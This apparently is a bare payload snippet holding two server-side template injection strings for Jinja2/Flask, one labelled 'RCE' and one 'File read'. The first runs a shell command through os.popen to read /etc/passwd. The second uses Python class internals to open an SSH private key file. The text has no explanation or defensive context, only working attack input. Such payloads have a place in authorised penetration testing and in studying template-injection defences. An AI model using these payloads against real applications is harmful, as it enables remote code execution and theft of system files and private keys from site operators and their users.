# RCE
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# File read
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/test/.ssh/id_rsa').read() }}
